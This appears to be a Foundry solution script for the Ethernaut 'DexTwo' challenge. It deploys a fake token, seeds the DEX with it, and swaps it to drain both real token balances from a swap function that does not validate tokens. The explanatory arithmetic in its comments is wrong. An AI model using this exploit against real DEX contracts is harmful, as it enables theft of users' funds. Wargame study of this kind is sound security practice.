// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/DexTwo.sol";
import "../src/DexTwoHack.sol";

contract DexHackScript is Script {
  DexTwo public dexContract = DexTwo(payable(address(0x1a9aeC240129bBb11d9530Df3B6c5465ea65D308)));
  SwappableTokenTwo public token1Contract = SwappableTokenTwo(payable(address(0x14281A3439deA6a0dDab6aA9E2C0D3439fe829A4)));
  SwappableTokenTwo public token2Contract = SwappableTokenTwo(payable(address(0xd255C97a30Cf5E2550B16e14CA314BBFfa89A7A2)));

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    address attackerAddress = 0x359bfB5160946a55f03c080c2DC6975C8F970d5C;
    vm.startBroadcast(attacker);

    uint256 i = 0;
    // Use helper they added to approve both tokens for more than we need
    dexContract.approve(address(dexContract), 1000);
    // deploy our coin, transfer to dex, then exploit
    DexTwoHack dexHackCoinContract = new DexTwoHack(attackerAddress);

    // Approve dex and transfer it
    dexHackCoinContract.approve(address(dexContract), 1000);
    dexHackCoinContract.transfer(address(dexContract), 1);

    // Balances before hack 
    console.log("pre-hack");
    console.log("dex hack coin",dexHackCoinContract.balanceOf(address(dexContract)));
    console.log("me hack coin", dexHackCoinContract.balanceOf(address(attackerAddress)));
    console.log("dex coin 1",token1Contract.balanceOf(address(dexContract)));
    console.log("me coin 1", token1Contract.balanceOf(address(attackerAddress)));
    console.log("dex coin 2",token2Contract.balanceOf(address(dexContract)));
    console.log("me coin 2", token2Contract.balanceOf(address(attackerAddress)));

    // Just need to send 1 the first time, as amount = 
    // 1*100 / 100 = 100
    dexContract.swap(address(dexHackCoinContract), address(token1Contract), 1);
    // send 2 second time as 
    // 2 * 100 / 100 = 50
    dexContract.swap(address(dexHackCoinContract), address(token2Contract), 2);

    console.log("post-hack");
    console.log("dex hack coin",dexHackCoinContract.balanceOf(address(dexContract)));
    console.log("me hack coin", dexHackCoinContract.balanceOf(address(attackerAddress)));
    console.log("dex coin 1",token1Contract.balanceOf(address(dexContract)));
    console.log("me coin 1", token1Contract.balanceOf(address(attackerAddress)));
    console.log("dex coin 2",token2Contract.balanceOf(address(dexContract)));
    console.log("me coin 2", token2Contract.balanceOf(address(attackerAddress)));

    vm.stopBroadcast();
  }
}